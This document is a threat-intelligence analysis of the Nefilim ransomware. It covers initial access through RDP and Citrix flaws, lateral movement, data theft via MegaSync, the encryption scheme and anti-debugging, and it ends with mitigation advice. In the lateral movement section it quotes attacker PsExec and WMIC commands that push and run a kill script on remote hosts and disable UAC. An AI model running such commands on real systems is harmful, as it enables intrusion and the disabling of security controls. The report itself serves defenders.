Over the past year there has been a rise in extortion malware that focuses on stealing sensitive data and
threatening to publish the data unless a ransom is paid. This technique bypasses some of the mitigations
put in place, such as backups, which would allow IT organizations to recover data without having to pay
such a ransom. One of the more popular ransomware families over the last few months to switch to this
extortion tactic was Nefilim.

About Nefilim Ransomware
Nefilim ransomware emerged in March 2020 when Nemty operators quit the ransomware as a service
model to concentrate their energy on more targeted attacks with more focused resources. The author of
the Nemty ransomware also appears to have shared Nemty’s source code with others. According to Vitali
Kremez and ID Ransomware’s Michael Gillespie, the new Nefilim ransomware appears to be based on
Nemty’s code. Sharing many notable similarities with Nemty version 2.5, Nefilim has the capabilities to
move laterally within networks.
Nefilim targets vulnerabilities such as CVE-2019-11634 and CVE-2019-19781 in Citrix gateway devices,
identified in December 2019 and patched in January 2020. The hackers target organizations using the
unpatched or poorly secured Citrix remote-access technology, stealing data and then deploying
ransomware.
Nefilim attackers exfiltrate sensitive data before encryption. When ransoms are not paid, they have been
known to shame victims by posting their data on the dark web.

Technical Details

1/8

Initial access
Nefilim ransomware is distributed through exposed Remote Desktop Protocol (RDP) setups by bruteforcing them and using other known vulnerabilities for initial access, i.e. vulnerabilities in Citrix gateway
devices. Nefilim places a heavy emphasis on Remote Desktop Protocols.
Once an attacker gains a foothold on the victim system, the attacker drops and executes its components
such as anti-antivirus, exfiltration tools, and finally Nefilim itself.
Lateral Movement
Among the various tactics and techniques used by the attackers, they rely on tools such as PsExec to
remotely execute commands in their victims’ networks. It has been also seen that Nefilim uses other tools
to gather credentials that include Mimikatz, LaZagne, and NirSoft’s NetPass. It uses bat files to stop
services/kill processes as shown in below image, and the stolen credentials are used to reach high-value
machines like servers. The hackers work to move around the network before deploying their ransomware
to find out where juicier data may be stored. They exfiltrate sensitive data before encryption.
Some of the commands that execute by the attacker
Start copy kill.bat \destinationip\c$\windows\temp
Start psexec.exe \destinationip -u domain\username\ -p password -d -h -r mstdc -s -accepteula nobanner c:\windows\teamp\Kill.bat
Start psexec.exe -accepteula \destinationip -u domain\username\ -p password reg add
HKLM\software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /F
WMIC /node: \destinationip /username:”domain\username” /password:”password” process CALL CREATE
“cmd.exe /c copy \sourceip\c$\windows\temp C:\WINDOWS\TEMP\kill.bat"
WMIC /node: \destinationip /username:”domain\username” /password:”password” process CALL CREATE
“cmd.exe /c C:\WINDOWS\TEMP\kill.bat"

Data exfiltration
It copies data from servers/shared directories to the local directory and compresses with dropped 7zip
binary. It also drops and installs MegaSync to exfiltrate data.

Ransomware Execution
The Nefilim malware uses AES-128 encryption to lock files and their blackmail payments are made via
email. After encryption, it dropped the ransomware note by named ‘NEFILIM-DECRYPT.txt’. All files are
encrypted with the extension of (.NEFILIM). It appends AES encrypted key at end of the encrypted file.
This AES encryption key will then be encrypted by an RSA-2048 public key that is embedded in the
ransomware executable. In addition to the encrypted AES key, the ransomware will also add the “NEFILIM”
string as a file marker to all encrypted files.

Some of the Anti-debugging techniques: Ransomware uses anti-debugging method by calling the
IsDebuggerPresent function. This function detects if the calling process is being debugged by a user-mode
debugger. It also makes use of API GetTickCount / QueryPerformanceCounter to get the number of ticks
since the last system reboot. It checks for a timestamp and compare it to another one after a few malicious
instructions, in order to check if there was a delay.

High-Profile Attacks Taking a Toll
Nefilim’s highest-profile ransomware attack to date was against the Australian shipping organization, Toll
Group. The attack was first published on May 5, 2020. Two months previously, Toll Group was a victim of a
Netwalker ransomware attack. In both cases, Toll Group refused to pay the ransom. In response, Nefilim
leaked sensitive Toll Group data and popularized that Toll Group had failed to employ full cybersecurity
protocols even after the Netwalker attack, potentially making the organization vulnerable to more attacks.
This demonstrates how Nefilim will keep the pressure on its victims to pay ransoms.

Mitigation or Additional Important Safety Measures
Network
Keep strong and unique passwords for login accounts.
Disable RDP if not used. If required change RDP port to a non-standard port.
Configure firewall in following way,
Deny access to Public IPs to important ports (in this case RDP port 3389)
Allow access to only IP’s which are under your control.
Use VPN to access the network, instead of exposing RDP to the Internet. Possibility implement Two
Factor Authentication (2FA).
Set lockout policy which hinders credentials guessing.
Create a separate network folder for each user when managing access to shared network folders.
Take regular data backup
Protect systems from ransomware by periodically backing up important files regularly and keep a
recent backup copy offline. Encrypt your backup.
If your computer gets infected with ransomware, your files can be restored from the offline backup
once the malware has been removed.
Always use a combination of online and offline backup.
6/8

Do not keep offline backups connected to your system as this data could be encrypted when
ransomware strike.
Keep software updated
Always keep your security software (antivirus, firewall, etc.) up to date to protect your computer from
new variants of malware.
Regularly patch and update applications, software, and operating systems to address any exploitable
software vulnerabilities.
Do not download cracked/pirated software as they risk backdoor entry for malware into your
computer.
Avoid downloading software from untrusted P2P or torrent sites. In most cases, they are malicious
software.
Having minimum required privileges
Don’t assign Administrator privileges to users. Most importantly, do not stay logged in as an
administrator unless it is strictly necessary. Also, avoid browsing, opening documents, or other
regular work activities while logged in as an administrator.

Monitor for Lateral Movement
To spot these attacks, keep an eye out not only for attack code but also monitor for any evidence of
lateral movement and data exfiltration within the environment. To determine if an organization has
been hit by Nefilim, check remote-access systems for any signs of unauthorized access. To identify
potential data exfiltration, additionally identify unusual host outbound traffic patterns.
